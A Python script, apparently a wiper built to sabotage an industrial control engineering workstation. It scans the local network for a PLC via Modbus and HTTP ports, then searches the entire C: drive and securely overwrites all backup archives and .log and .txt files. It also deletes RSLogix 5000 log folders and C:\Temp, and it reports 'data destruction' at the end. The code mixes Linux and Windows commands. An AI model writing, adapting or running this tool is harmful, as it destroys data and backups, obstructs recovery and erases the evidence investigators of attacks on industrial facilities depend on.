import os
import subprocess
import socket
import re
import time

# --- Configuration ---
PLC_IP = None  # Initially unknown, will be discovered
BACKUP_FILE_EXTENSIONS = [".bak", ".zip", ".tar.gz", ".7z", ".gz"] # Example Backup Extensions
LOG_FILE_EXTENSIONS = [".log", ".txt"] # Example Log Extensions
SLEEP_DURATION = 5  # Time to wait between operations (seconds)

# --- Helper Functions ---

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address by scanning the local network
    Assumes the PLC responds to ping.  Modify to suit your specific PLC.
    """
    try:
        # Get the default gateway, which is most likely the router or network device
        output = subprocess.check_output(["route", "-n"]).decode("utf-8")
        default_gateway_line = None

        for line in output.splitlines():
            if "UG" in line:
                default_gateway_line = line
                break

        if default_gateway_line is None:
            print("Error: Could not determine default gateway.")
            return None

        default_gateway = default_gateway_line.split()[1]

        # Get the IP address of the workstation itself
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Connect to a public DNS server
        local_ip = s.getsockname()[0]
        s.close()

        # Extract the network part of the IP address (e.g., 192.168.1.0)
        network_prefix = ".".join(local_ip.split(".")[:3])

        # Ping scan the network for PLC
        print(f"Scanning network {network_prefix}.* for PLC... (This might take a while)")
        for i in range(1, 255):
            target_ip = f"{network_prefix}.{i}"
            try:
                # Use ping with a short timeout
                result = subprocess.run(["ping", "-n", "1", "-w", "500", target_ip],
                                       capture_output=True, timeout=1, text=True)

                # Check if the ping was successful
                if result.returncode == 0:
                    print(f"Ping successful for: {target_ip}")

                    # Try connecting to port 502 (Modbus, often used by PLCs)
                    try:
                        socket.create_connection((target_ip, 502), timeout=1)
                        print(f"PLC found at: {target_ip} (Modbus port 502 open)")
                        return target_ip  # Found the PLC, return its IP address
                    except (socket.timeout, ConnectionRefusedError):
                        # Modbus port is not open, check for http ports 80 and 8080
                        try:
                            socket.create_connection((target_ip, 80), timeout=1)
                            print(f"PLC found at: {target_ip} (HTTP port 80 open)")
                            return target_ip  # Found the PLC, return its IP address
                        except (socket.timeout, ConnectionRefusedError):
                            try:
                                socket.create_connection((target_ip, 8080), timeout=1)
                                print(f"PLC found at: {target_ip} (HTTP port 8080 open)")
                                return target_ip  # Found the PLC, return its IP address
                            except (socket.timeout, ConnectionRefusedError):
                                print(f"No known PLC services found on {target_ip}")

            except subprocess.TimeoutExpired:
                pass  # Ping timed out, continue to the next IP

            except subprocess.CalledProcessError as e:
                print(f"Error during ping to {target_ip}: {e}")

    except Exception as e:
        print(f"Error during IP discovery: {e}")

    print("PLC IP address not found.")
    return None


def wipe_file(filepath):
    """
    Securely deletes a file using SDelete or equivalent.
    If SDelete is not available, falls back to a less secure method.
    """
    try:
        # Check if SDelete is in the system's PATH or the current directory
        subprocess.run(["sdelete", "-p", "3", "-s", filepath], check=True, capture_output=True)
        print(f"Successfully wiped file: {filepath} using SDelete")
    except FileNotFoundError:
        print("SDelete not found. Falling back to standard deletion.")
        try:
            os.remove(filepath)
            print(f"Successfully deleted file: {filepath}")
        except Exception as e:
            print(f"Error deleting file {filepath}: {e}")

    except subprocess.CalledProcessError as e:
        print(f"Error wiping file {filepath} using SDelete: {e}")
        print(f"SDelete Error Output:\n{e.stderr.decode()}")

def find_files_by_extension(root_dir, extensions):
    """
    Recursively searches for files with specified extensions in a directory.
    """
    files_found = []
    for root, _, files in os.walk(root_dir):
        for file in files:
            if any(file.lower().endswith(ext) for ext in extensions):
                files_found.append(os.path.join(root, file))
    return files_found

def cleanup_directories(directories):
    """
    Deletes all files and subdirectories within the specified directories.
    """
    for directory in directories:
        if os.path.exists(directory):
            print(f"Cleaning up directory: {directory}")
            try:
                for root, dirs, files in os.walk(directory, topdown=False): # Reverse order ensures subdirectories are deleted first
                    for file in files:
                        filepath = os.path.join(root, file)
                        wipe_file(filepath)  # Securely delete each file

                    for dir in dirs:
                        dirpath = os.path.join(root, dir)
                        try:
                            os.rmdir(dirpath)  # Remove empty directory
                            print(f"Successfully removed directory: {dirpath}")
                        except OSError as e:
                            print(f"Error removing directory {dirpath}: {e}")

                #Finally remove the top level directory, if it exists
                try:
                    os.rmdir(directory)
                    print(f"Successfully removed directory: {directory}")
                except OSError as e:
                    print(f"Error removing top level directory {directory}: {e}")

            except Exception as e:
                print(f"Error cleaning up directory {directory}: {e}")
        else:
            print(f"Directory not found: {directory}")



# --- Main Script ---

if __name__ == "__main__":
    # 1. Discover PLC IP Address
    PLC_IP = find_plc_ip()

    if not PLC_IP:
        print("Aborting: Could not find PLC IP address.")
        exit(1)

    print(f"PLC IP Address: {PLC_IP}")
    time.sleep(SLEEP_DURATION)

    # 2. Locate potential backup files on the Windows machine
    print("Searching for potential backup files...")
    backup_files = find_files_by_extension("C:\\", BACKUP_FILE_EXTENSIONS) # Search from the C drive root.  Customize as needed.

    if backup_files:
        print("Found backup files:")
        for file in backup_files:
            print(file)
        time.sleep(SLEEP_DURATION)

        print("Wiping backup files...")
        for file in backup_files:
            wipe_file(file)
            time.sleep(SLEEP_DURATION)
    else:
        print("No backup files found with specified extensions.")


    # 3. Locate and delete log files
    print("Searching for log files...")
    log_files = find_files_by_extension("C:\\", LOG_FILE_EXTENSIONS)

    if log_files:
        print("Found log files:")
        for file in log_files:
            print(file)
        time.sleep(SLEEP_DURATION)

        print("Wiping log files...")
        for file in log_files:
            wipe_file(file)
            time.sleep(SLEEP_DURATION)
    else:
        print("No log files found with specified extensions.")


    # 4. Cleanup specific directories (Customize these to target directories used by engineering workstation, PLC programming software, etc.)
    target_directories = [
        "C:\\ProgramData\\Rockwell Automation\\RSLogix 5000\\Logs", # Example: RSLogix 5000 log directory (adjust path)
        "C:\\Temp" #Example temp directory
    ]

    cleanup_directories(target_directories)


    print("Data destruction and cleanup process complete.")